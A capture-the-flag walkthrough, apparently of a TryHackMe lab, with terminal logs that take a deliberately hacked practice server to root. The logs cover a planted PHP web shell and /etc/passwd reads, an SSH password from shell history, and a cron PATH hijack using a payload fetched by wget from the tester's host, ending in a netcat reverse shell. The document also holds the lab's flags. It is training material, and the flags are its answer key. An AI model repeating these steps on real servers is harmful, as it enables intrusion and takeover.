---
Someone has compromised this server already! Can you get in and evade their countermeasures?
---

![](https://i.imgur.com/5q36e1g.png)


###  Get on and boot them out! 

The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?

```
rustscan port 80 and 22
feroxbuster /cvs /upload.php
Hacked! If you dont want me to upload my shell, do better at filtering! 
<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->

                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir --url http://10.10.247.186/cvs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -k -x pdf.php,php.pdf                        
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.247.186/cvs/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              pdf.php,php.pdf
[+] Timeout:                 10s
===============================================================
2022/09/22 12:15:23 Starting gobuster in directory enumeration mode
===============================================================
/shell.pdf.php        (Status: 200) [Size: 18]




┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir --url http://10.10.247.186/cvs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -k -x pdf.php,php.pdf                        
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.247.186/cvs/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              pdf.php,php.pdf
[+] Timeout:                 10s
===============================================================
2022/09/22 12:15:23 Starting gobuster in directory enumeration mode
===============================================================
/shell.pdf.php        (Status: 200) [Size: 18]
Progress: 10098 / 661683 (1.53%)             ^C

boom!

so filtering

http://10.10.247.186/cvs/shell.pdf.php?cmd=whoami
www-data

http://10.10.247.186/cvs/shell.pdf.php?cmd=cat%20/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
lachlan:x:1001:1001::/home/lachlan:/bin/sh

so user lachlan
http://10.10.247.186/cvs/shell.pdf.php?cmd=xxd%20/home/lachlan/user.txt

00000000: 7468 6d7b 6166 3765 3436 6236 3830 3831  thm{af7e46b68081
00000010: 6434 3032 3563 3563 6531 3038 3531 3433  d4025c5ce1085143
00000020: 3036 3137 7d0a                           0617}.

http://10.10.247.186/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt

thm{af7e46b68081d4025c5ce10851430617}

boom!

find some pass to ssh port 22

http://10.10.247.186/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan/

drwxr-xr-x 4 lachlan lachlan 4096 May  5 04:39 .
drwxr-xr-x 3 root    root    4096 May  5 04:38 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5 04:38 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwx------ 2 lachlan lachlan 4096 May  5 04:39 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
drwxr-xr-x 2 lachlan lachlan 4096 May  5 04:38 bin
-rw-r--r-- 1 lachlan lachlan   38 May  5 04:38 user.txt

http://10.10.247.186/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan/bin

total 12
drwxr-xr-x 2 lachlan lachlan 4096 May  5 04:38 .
drwxr-xr-x 4 lachlan lachlan 4096 May  5 04:39 ..
-rw-r--r-- 1 lachlan lachlan   56 May  5 04:38 backup.sh


http://10.10.247.186/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/bin/backup.sh

# todo: pita website backup as requested by her majesty


http://10.10.247.186/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history

./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history

ssh lachlan:thisistheway123


┌──(kali㉿kali)-[~/Downloads]
└─$ ssh lachlan@10.10.247.186
lachlan@10.10.247.186's password: 
Permission denied, please try again.
lachlan@10.10.247.186's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 22 Sep 2022 04:32:00 PM UTC

  System load:  0.08              Processes:             136
  Usage of /:   25.1% of 9.78GB   Users logged in:       0
  Memory usage: 51%               IPv4 address for eth0: 10.10.247.186
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May  5 04:39:19 2022 from 192.168.56.1
$ pwd
/home/lachlan
$ nope
Connection to 10.10.247.186 closed.

uhmm

http://10.10.247.186/cvs/shell.pdf.php?cmd=ls%20/etc/cron.d

e2scrub_all
persistence
php
popularity-contest

http://10.10.247.186/cvs/shell.pdf.php?cmd=cat%20/etc/cron.d/persistence

PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done

jaja

                                                                                                           
https://www.ibm.com/docs/en/zos/2.4.0?topic=socrlp-options
-T
    Disables pty allocation. This option overrides the -t option.


┌──(kali㉿kali)-[~/Downloads]
└─$ ssh lachlan@10.10.247.186 -T
lachlan@10.10.247.186's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 22 Sep 2022 04:35:53 PM UTC

  System load:  0.0               Processes:             117
  Usage of /:   25.1% of 9.78GB   Users logged in:       0
  Memory usage: 50%               IPv4 address for eth0: 10.10.247.186
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


pwd
/home/lachlan


priv esc

using https://www.revshells.com/

so upload a payload in order to get a rev shell

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ nano pkill        
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ ls
pkill  shell.pdf.php  shell.php5
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.247.186 - - [22/Sep/2022 12:42:41] "GET /pkill HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.


pwd
/home/lachlan
cd bin
pwd
/home/lachlan/bin
wget http://10.18.1.77:8000/pkill
--2022-09-22 16:42:41--  http://10.18.1.77:8000/pkill
Connecting to 10.18.1.77:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 80 [application/octet-stream]
Saving to: ‘pkill’

     0K                                                       100% 13.3M=0s

2022-09-22 16:42:42 (13.3 MB/s) - ‘pkill’ saved [80/80]

chmod +x pkill
ls -la
total 16
drwxr-xr-x 2 lachlan lachlan 4096 Sep 22 16:42 .
drwxr-xr-x 4 lachlan lachlan 4096 May  5 04:39 ..
-rw-r--r-- 1 lachlan lachlan   56 May  5 04:38 backup.sh
-rwxrwxr-x 1 lachlan lachlan   80 Sep 22 16:42 pkill


revshell

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ rlwrap nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.247.186.
Ncat: Connection from 10.10.247.186:51246.
bash: cannot set terminal process group (3804): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~# ls
ls
root.txt
snap
root@b2r:~# cat root.txt
cat root.txt
thm{7b708e5224f666d3562647816ee2a1d4}


```

![[Pasted image 20220922112125.png]]


What is the user.txt flag?
The hacker may have been a bit sloppy in their stealth measures...
*thm{af7e46b68081d4025c5ce10851430617}*

What is the proof.txt flag?
...and a bit sloppy in their automated kill scripts.
*thm{7b708e5224f666d3562647816ee2a1d4}*


[[Deja Vu]]